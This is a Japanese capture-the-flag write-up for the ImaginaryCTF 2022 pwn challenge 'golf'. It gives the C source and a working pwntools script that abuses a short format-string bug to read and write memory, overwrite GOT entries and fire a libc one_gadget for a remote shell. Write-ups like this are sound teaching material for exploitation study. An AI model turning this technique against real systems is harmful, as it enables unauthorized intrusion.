---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: golf
genre: pwn
solved_date: 2022-07-17
during_ctf: true
tag: [fsb]
fav: false
difficulty: normal
---

### 概要

`strlen` が 11 未満ならば、その文字列を用いて `printf` を呼ぶことができるバイナリがリモートで動いている。

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

<details><summary>元コード</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

__attribute__((constructor))

_(){setvbuf /* well the eyes didn't work out */
(stdout,0,2
,0);setvbuf
(stdin,0,2,
0);setvbuf(
stderr,0,2,
0)       ;}

main( ){ char  /* sus */
aa[       256
];;       ;;;
fgets(aa,256,
stdin ) ; if(
strlen (aa) <
11)printf(aa)
; else ; exit
(00       );}

/* i tried :sob: */
```

</details>

<details><summary>整形済みコード</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

__attribute__((constructor))

_() {
  setvbuf(stdout,0,2,0);
  setvbuf(stdin,0,2,0);
  setvbuf(stderr,0,2,0);
}

main() {
  char aa[256];
  fgets(aa,256,stdin); 
  if(strlen(aa) < 11)printf(aa);
  else;
  exit(00);
}

/* i tried :sob: */
```

</details>


### 解法
文字数制限が厳しいので、引数によって書き込む文字数を指定することにした。これで、AAR/AAW が可能となった。これを用いて、まずは `exit` の got を main に向けた。ここからはいろいろな手法で shell が取れるが、今回は one gadget を用いることとした。libc のバージョンが与えられていなかったので、まずは libc のバージョンを決定した。その後に `setvbuf` の got に one gadget を書き込み、`exit` の got を初期化処理に向けることで one gadget を発火させた。

<details><summary>スクリプト</summary>

```py
from pwn import *

BIN_NAME = 'golf'
REMOTE_ADDR = 'golf.chal.imaginaryctf.org'
REMOTE_PORT = 1337
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def aaw(addr, val):
  print(f'[+] aaw({addr=}, {val=})')
  payload = f'%*9$c%8$hn'.encode()
  assert len(payload) < 11
  payload = payload.ljust(16, b'\x00')
  payload += pack(addr)   # 8
  payload += pack(val)    # 9
  stream.sendline(payload)


def aar(addr):
  payload = f'#%8$s!!'.encode()
  assert len(payload) < 11
  payload = payload.ljust(16, b'\x00')
  payload += pack(addr)   # 8
  stream.sendline(payload)
  stream.recvuntil(b'#', drop=True)
  s = stream.recvuntil(b'!!', drop=True)
  return unpack(s, "all")

pause()
aaw(chall.got["exit"], chall.symbols["main"] & 0xffff)
printf_addr = aar(chall.got["printf"])
print(f'[+] {hex(printf_addr)=}')
setvbuf_addr = aar(chall.got["setvbuf"])
print(f'[+] {hex(setvbuf_addr)=}')

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
libc.address = printf_addr - libc.symbols["printf"]
assert setvbuf_addr == libc.symbols["setvbuf"]

one_gadget = libc.address + [0xe3afe, 0xe3b01, 0xe3b04, 0xe3cf3, 0xe3cf6][1]

print(f'[+] {hex(one_gadget)=}')

addr = chall.got["setvbuf"]
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')
aaw(chall.got["setvbuf"] + 0, (one_gadget >> 0) & 0xffff)
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')
aaw(chall.got["setvbuf"] + 2, (one_gadget >> 16) & 0xffff)
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')
aaw(chall.got["setvbuf"] + 4, (one_gadget >> 32) & 0xffff)
print(f'[+] {hex(aar(chall.got["setvbuf"]))=}')

pause()
aaw(chall.got["exit"], (chall.symbols["_"] + 0x21) & 0xffff)

stream.interactive()
```

</details>

